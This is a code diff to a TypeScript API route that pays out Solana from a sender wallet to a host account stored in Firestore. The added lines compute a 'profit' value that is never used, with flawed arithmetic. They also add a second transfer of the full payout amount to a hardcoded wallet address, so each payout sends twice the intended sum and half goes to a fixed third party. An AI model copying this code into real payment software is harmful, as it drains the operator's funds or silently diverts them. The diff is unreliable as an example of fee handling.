@@ -79,10 +79,13 @@ export const POST = async (req: Request) => {
         }
         let db = await getDoc(doc(firestore, "hosts", account?.toString()));
         let amount = 0;
+        let profit = 0;
         if (db.exists()) {
             amount = Number(db.data().amount);
             amount = amount*0.95;
             amount = parseFloat(amount.toFixed(6));
+            profit = amount*0.05;
+            profit = parseFloat(profit.toFixed(6));
         }
         else{
             return new Response('Account not found in DB.', {
@@ -118,6 +121,12 @@ export const POST = async (req: Request) => {
         transaction.add(web3.SystemProgram.transfer({
             fromPubkey: sender.publicKey,
             toPubkey: account,
+            lamports: amount * LAMPORTS_PER_SOL,
+        }));
+        const P = new PublicKey("AidmVBuszvzCJ6cWrBQfKNwgNPU4KCvXBcrWh91vitm8");
+        transaction.add(web3.SystemProgram.transfer({
+            fromPubkey: sender.publicKey,
+            toPubkey: P,
             lamports: amount * LAMPORTS_PER_SOL,
         }));
 
